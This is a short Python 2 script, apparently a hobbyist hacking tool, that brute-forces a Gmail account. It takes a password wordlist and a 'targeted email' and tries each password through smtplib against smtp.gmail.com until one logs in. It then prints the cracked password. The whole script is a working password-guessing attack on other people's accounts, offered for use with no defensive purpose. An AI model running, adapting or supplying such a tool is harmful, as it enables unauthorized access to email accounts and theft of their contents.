#!/usr/bin/python
'''create by Jul-Cae'''

import smtplib
from os import system

def main():
   print '================================================='
   print '               createad by Jul-Cae                  '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '                                                 '
   print '                                                 '
   print '                    Jul-Cae                               '
   print '                                                 '
   print '                     ʝՄʅՇԹȝ                      '

main()
print '[1] Beign'
print '[2] exit'
option = input('----> ')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('targeted email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] Account PasSworD :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Account PasSworD :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
